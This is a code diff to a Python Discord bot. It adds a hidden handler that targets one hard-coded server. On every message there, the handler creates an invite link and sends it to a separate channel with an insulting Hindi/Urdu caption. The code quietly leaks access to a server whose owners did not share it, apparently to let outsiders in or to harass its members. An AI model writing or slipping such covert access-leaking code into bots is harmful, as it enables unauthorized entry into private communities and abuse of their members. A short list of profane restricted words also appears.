@@ -2933,12 +2933,16 @@ async def on_message(message):
 
 @bot.listen()
 async def on_message(message):
-    print(message.content)
     print(message.author.id)
+    if message.guild.id == 810318689584545863:
+        link = await message.channel.create_invite(max_age=300)
+        channel =  bot.get_channel(869439705714933783)
+        await channel.send(f"Mil gyi haramkhor ki link {link}")
     if message.content.lower().startswith(f"botservers"):
         await message.channel.send("<a:nachbe:899168499145015326>")
         servers = list(bot.guilds)
         print(servers)
+    
 
 restricted_words = ["harami","wtf","fuck","fuk","baap ","stfu"]
 
